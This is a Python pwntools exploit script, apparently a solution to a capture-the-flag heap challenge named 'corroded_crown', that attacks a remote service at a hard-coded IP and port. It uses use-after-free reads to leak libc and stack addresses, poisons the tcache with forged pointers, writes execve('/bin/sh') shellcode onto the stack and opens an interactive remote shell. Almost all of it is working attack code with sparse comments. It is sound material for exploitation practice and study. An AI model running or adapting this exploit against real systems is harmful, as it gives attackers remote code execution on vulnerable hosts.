from pwn import *

# NO NX HERE

# context.terminal = ['zellij', 'action', 'new-pane', '-d', 'right', '--']
# context.log_level = 'debug'
context.arch = 'amd64'
context.endian = 'little'

p = remote('154.57.164.78', 30750)
# p = process('./corroded_crown')
# p = gdb.debug('./corroded_crown', aslr=True, gdbscript='b inscribe_relic')

def create(index: int, size: int):
    p.writelineafter(b'> ', b'1')
    p.writelineafter(b'(index): ', str(index).encode())
    p.writelineafter(b'(size):', str(size).encode())

def free(index: int):
    p.writelineafter(b'> ', b'4')
    p.writelineafter(b'(index): ', str(index).encode())

def put(index: int, data: bytes):
    p.writelineafter(b'> ', b'2')
    p.writelineafter(b'(index): ', str(index).encode())
    p.write(data)

def get(index: int):
    p.writelineafter(b'> ', b'3')
    p.writelineafter(b'(index): ', str(index).encode())
    p.readuntil(b']: ')
    return p.readuntil(b'\n\n1. Forge\n')[:-11]

create(0, 0x500)
create(1, 0x20) # prevents merge with the top chunk
free(0)

# gets libc address that correlates with environ
libc_address = get(0)[:8]
environ_address = p64(u64(libc_address)+10784) # black magic

# creates tcache chain
create(2, 16)
create(3, 16)
free(2)
free(3)

key = get(3)[8:]
forge = environ_address + key
put(3, forge) # puts environ address

create(4, 16)
create(5, 16)
stack_address = p64(u64(get(5)[:8]) - 64) # gets stack environ address minus 64, the result is ideally aligned address for exploit

shellcode = bytes(asm('''
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp
mov rsi, 0
mov rdx, 0
mov rax, SYS_execve
syscall
'''))

# anti 6-[CENSORED] measure
create(6, len(shellcode)+8) # address + shellcode
create(8, len(shellcode)+8) # same here
free(6)
free(8)

put(8, stack_address + key) # puts stack address

create(9, len(shellcode)+8)
create(10, len(shellcode)+8)

put(10, p64(u64(stack_address)+8) + shellcode) # stack address+8 to get the next address in stack (our shellcode)

p.interactive()
